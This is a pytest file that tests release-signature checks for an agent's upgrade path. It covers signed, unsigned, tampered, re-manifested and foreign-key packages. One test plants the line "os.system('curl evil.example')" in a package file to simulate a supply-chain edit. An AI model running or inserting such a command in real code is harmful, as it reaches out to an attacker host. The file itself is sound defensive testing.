"""An upgrade installs code. These are the ways it must refuse to.

Every test here is written from the attacker's side: not "does a good release
work", but "here is a thing somebody could put on the disk, does it get
installed". The one positive test exists so that the refusals cannot be
passing because everything is refused.
"""
from __future__ import annotations

import os
import zipfile

import pytest

from aki_agent import ed25519, engine, release_trust


@pytest.fixture
def key(monkeypatch):
    """A release key for the duration of one test, trusted as the maintainer's."""
    secret = os.urandom(32)
    monkeypatch.setattr(release_trust, "TRUSTED_KEYS",
                        {"test-key": ed25519.public_key(secret).hex()})
    return secret


def _a_package(root, contents=None):
    """The smallest thing `looks_like_the_package` accepts."""
    (root / "src" / "aki_agent").mkdir(parents=True, exist_ok=True)
    (root / "src" / "aki_agent" / "__init__.py").write_text(
        contents or "__version__ = '9.9.9'\n", encoding="utf-8")
    (root / "pyproject.toml").write_text("[project]\nname='aki-agent'\n",
                                         encoding="utf-8")
    # `looks_like_the_package` wants this one too, and it is checked before
    # anything is copied over a working install.
    (root / "bin").mkdir(parents=True, exist_ok=True)
    (root / "bin" / "_bootstrap.py").write_text("# bootstrap\n",
                                                encoding="utf-8")
    return root


def test_a_signed_release_is_trusted(tmp_path, key):
    package = _a_package(tmp_path / "release")
    release_trust.sign_release(package, key.hex())

    verdict = release_trust.verify_package(package)
    assert verdict.trusted, verdict.problem
    assert verdict.signer == "test-key"


def test_an_unsigned_release_is_not(tmp_path, key):
    package = _a_package(tmp_path / "release")
    assert not release_trust.verify_package(package).trusted


def test_editing_one_file_after_signing_is_caught(tmp_path, key):
    package = _a_package(tmp_path / "release")
    release_trust.sign_release(package, key.hex())
    (package / "src" / "aki_agent" / "__init__.py").write_text(
        "import os; os.system('curl evil.example')\n", encoding="utf-8")

    verdict = release_trust.verify_package(package)
    assert not verdict.trusted
    assert any("changed" in d for d in verdict.differences)


def test_adding_a_file_after_signing_is_caught(tmp_path, key):
    """The interesting one: nothing listed in the manifest is touched.

    A check that only re-hashed the files it was told about would pass this
    while a new module sat in the package waiting to be imported.
    """
    package = _a_package(tmp_path / "release")
    release_trust.sign_release(package, key.hex())
    (package / "src" / "aki_agent" / "extra.py").write_text(
        "STOLEN = True\n", encoding="utf-8")

    verdict = release_trust.verify_package(package)
    assert not verdict.trusted
    assert any("added" in d for d in verdict.differences)


def test_rewriting_the_manifest_does_not_help(tmp_path, key):
    """An attacker who edits files can edit the manifest to match. So the
    signature is checked against the manifest before the manifest is trusted
    to describe anything."""
    package = _a_package(tmp_path / "release")
    release_trust.sign_release(package, key.hex())
    (package / "src" / "aki_agent" / "__init__.py").write_text("EVIL = 1\n",
                                                               encoding="utf-8")
    (package / release_trust.MANIFEST_NAME).write_text(
        release_trust.build_manifest(package), encoding="utf-8")

    assert not release_trust.verify_package(package).trusted


def test_signing_it_with_your_own_key_does_not_help(tmp_path, key):
    package = _a_package(tmp_path / "release")
    release_trust.sign_release(package, os.urandom(32).hex())
    assert not release_trust.verify_package(package).trusted


def test_a_corrupt_signature_file_is_refused_not_crashed(tmp_path, key):
    package = _a_package(tmp_path / "release")
    release_trust.sign_release(package, key.hex())
    (package / release_trust.SIGNATURE_NAME).write_text("not hex at all",
                                                        encoding="utf-8")
    verdict = release_trust.verify_package(package)
    assert not verdict.trusted
    assert verdict.problem


# ---------------------------------------------------------------------------
# The gate itself: what `upgrade` actually does with all of the above
# ---------------------------------------------------------------------------

def _zip_of(package, target):
    with zipfile.ZipFile(target, "w") as archive:
        for path in sorted(package.rglob("*")):
            if path.is_file():
                archive.write(path,
                              f"top/{path.relative_to(package).as_posix()}")
    return target


def test_upgrade_refuses_an_unsigned_zip(tmp_path, key):
    """The whole point. Before 2026-09-06 this returned the folder."""
    package = _a_package(tmp_path / "build")
    archive = _zip_of(package, tmp_path / "Aki-Agent-Beta-20260101-001.zip")

    found, problem = engine.source_for_upgrade(archive,
                                               workspace=tmp_path / "ws")
    assert found is None
    assert "not signed" in problem
    assert "--allow-unsigned" in problem


def test_upgrade_accepts_a_signed_zip(tmp_path, key):
    package = _a_package(tmp_path / "build")
    release_trust.sign_release(package, key.hex())
    archive = _zip_of(package, tmp_path / "Aki-Agent-Beta-20260101-002.zip")

    found, problem = engine.source_for_upgrade(archive,
                                               workspace=tmp_path / "ws")
    assert found is not None, problem


def test_upgrade_refuses_a_signed_zip_somebody_edited(tmp_path, key):
    """Signed, then tampered with -- the shape of a real supply-chain
    attack, where the attacker starts from a genuine release."""
    package = _a_package(tmp_path / "build")
    release_trust.sign_release(package, key.hex())
    archive = tmp_path / "Aki-Agent-Beta-20260101-003.zip"
    with zipfile.ZipFile(archive, "w") as out:
        for path in sorted(package.rglob("*")):
            if not path.is_file():
                continue
            data = path.read_bytes()
            if path.name == "__init__.py":
                data = b"BACKDOOR = True\n"
            out.writestr(f"top/{path.relative_to(package).as_posix()}", data)

    found, problem = engine.source_for_upgrade(archive,
                                               workspace=tmp_path / "ws")
    assert found is None
    assert "do not match" in problem


def test_a_person_can_still_vouch_for_an_unsigned_zip(tmp_path, key):
    """The door in the wall. Without it the check gets switched off wholesale
    by the first person who needs to install their own build."""
    package = _a_package(tmp_path / "build")
    archive = _zip_of(package, tmp_path / "Aki-Agent-Beta-20260101-004.zip")

    found, _ = engine.source_for_upgrade(archive, workspace=tmp_path / "ws",
                                         allow_unsigned=True)
    assert found is not None


def test_the_real_release_carries_a_signature():
    """The build script signs, and the key in the package matches it.

    A signature scheme where the shipped release happens to be unsigned is a
    scheme nobody is using. Skipped when there is no build to look at.
    """
    from pathlib import Path

    releases = sorted(Path(__file__).resolve().parent.parent
                      .glob("_release/*.zip"))
    if not releases:
        pytest.skip("no release built here")

    newest = releases[-1]
    with zipfile.ZipFile(newest) as archive:
        names = archive.namelist()
    assert any(n.endswith(release_trust.MANIFEST_NAME) for n in names), \
        f"{newest.name} has no manifest"
    assert any(n.endswith(release_trust.SIGNATURE_NAME) for n in names), \
        f"{newest.name} has no signature"
